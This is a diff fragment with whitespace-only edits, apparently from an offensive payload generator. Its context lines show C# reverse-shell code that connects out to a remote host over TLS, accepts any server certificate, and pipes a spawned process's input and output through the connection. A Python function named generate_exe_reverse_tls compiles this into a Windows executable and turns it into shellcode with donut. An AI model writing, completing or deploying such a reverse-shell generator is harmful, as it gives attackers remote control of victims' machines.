@@ -37,16 +37,16 @@ class Program
 	{{
 		try
 		{{
-			
+
 			using (var client = new TcpClient(RemoteHost, RemotePort))
-			
+
 			using (var ssl = new SslStream(
 				client.GetStream(),
 				leaveInnerStreamOpen: false,
 				userCertificateValidationCallback: (_,__,___,____) => true
 			))
 			{{
-				
+
 				ssl.AuthenticateAsClient(
 					targetHost: RemoteHost,
 					clientCertificates: null,
@@ -68,7 +68,7 @@ class Program
 				}};
 				p.Start();
 
-				
+
 				var tOut = new Thread(() => CopyStream(p.StandardOutput.BaseStream, ssl)) {{ IsBackground = true }};
 				var tErr = new Thread(() => CopyStream(p.StandardError .BaseStream, ssl)) {{ IsBackground = true }};
 				var tIn  = new Thread(() => CopyStream(ssl,               p.StandardInput.BaseStream)) {{ IsBackground = true }};
@@ -114,7 +114,7 @@ def generate_exe_reverse_tls(ip, port, stager_ip, stager_port):
 	try:
 		with os.fdopen(fd, "w") as f:
 			f.write(raw)
-		
+
 		# 3) compile with Mingw‑w64 as x86_64 Windows exe
 		exe_path = c_path[:-2] + ".exe"
 		mcs = "mcs"
@@ -146,7 +146,7 @@ def generate_exe_reverse_tls(ip, port, stager_ip, stager_port):
 
 		with open(sc_path, "wb") as f:
 			f.write(shellcode)
-		
+
 		with open(sc_path, "rb") as f:
 			donut_file = f.read()
 
